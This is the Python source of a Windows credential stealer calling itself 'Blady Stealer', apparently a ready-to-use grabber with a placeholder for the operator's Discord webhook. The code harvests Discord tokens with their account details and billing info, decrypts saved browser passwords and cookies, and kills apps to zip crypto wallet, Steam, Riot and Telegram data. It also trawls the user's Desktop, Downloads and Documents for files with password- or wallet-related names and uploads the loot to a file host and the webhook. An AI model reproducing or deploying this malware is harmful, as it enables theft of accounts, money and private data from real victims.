import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import requests
import subprocess
import urllib.request
import tempfile
import subprocess
import base64

#  THIS IS 1.0 VERSION
#
hook = "PUT_YOUR_WEEBHOOK"
DETECTED = False

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass
def globalInfo():
    ip = getip()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    # print(globalinfo)
    return globalinfo


def Trust(Cookies):
    # simple Trust Factor system
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def GetUHQFriends(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist


def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "            
    return billing



def GetBadge(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


def uploadToken(token, path):
    global hook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)

    if pfp == None: 
        pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = GetBilling(token)
    badge = GetBadge(flags)
    friends = GetUHQFriends(token)
    if friends == '': friends = "No Rare Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{globalInfo()} | Found in `{path}`',
        "embeds": [
            {
            "color": 14406413,
            "fields": [
                {
                    "name": ":rocket: Token:",
                    "value": f"`{token}`\n[Click to copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": ":envelope: Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": ":mobile_phone: Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": ":globe_with_meridians: IP:",
                    "value": f"`{getip()}`",
                    "inline": True
                },
                {
                    "name": ":beginner: Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": ":credit_card: Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": ":clown: HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "@Blady STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
        "username": "Blady Stealer",
        "attachments": []
        }
    # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "wpcook":
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000: 
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "Blady | Cookies Stealer",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@Blady STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                    }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return
    if name == "wppassw":
        ra = ' | '.join(da for da in paswWords)
        if len(ra) > 1000: 
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": globalInfo(),
            "embeds": [
                {
                    "title": "Blady | Password Stealer",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
                    "color": 14406413,
                    "footer": {
                        "text": "@Blady STEALER",
                        "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                    }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "kiwi":
        data = {
            "content": globalInfo(),
            "embeds": [
                {
                "color": 14406413,
                "fields": [
                    {
                    "name": "Interesting files found on user PC:",
                    "value": link
                    }
                ],
                "author": {
                    "name": "Blady | File Stealer"
                },
                "footer": {
                    "text": "@Blady STEALER",
                    "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
                }
                }
            ],
            "username": "Blady",
            "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
            "attachments": []
            }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return



# def upload(name, tk=''):
#     headers = {
#         "Content-Type": "application/json",
#         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
#     }

#     # r = requests.post(hook, files=files)
#     LoadRequests("POST", hook, files=files)
def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\wp{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--Blady STEALER ON TOP-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

Tokens = ''
def getToken(path, arg):
    if not os.path.exists(path): return

    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                # print(token)
                                Tokens += token
                                uploadToken(token, path)

Passw = []
def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
            PasswCount += 1
    writeforfile(Passw, 'passw')

Cookies = []    
def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path): return
    
    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return
    
    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data: 
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Blady Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 15781403,
            "footer": {
                "text": "@Blady STEALER",
                "icon_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg"
            }
            }
        ],
        "username": "Blady Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1025091181987770410/1041066385033404507/xjAO7nz.jpg",
        "attachments": []
    }
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    # lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    # for patt in browserPaths:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    # for patt in PathsToZip:
    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False
def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
    # Do not Delete it will fuck the grabber up
    #
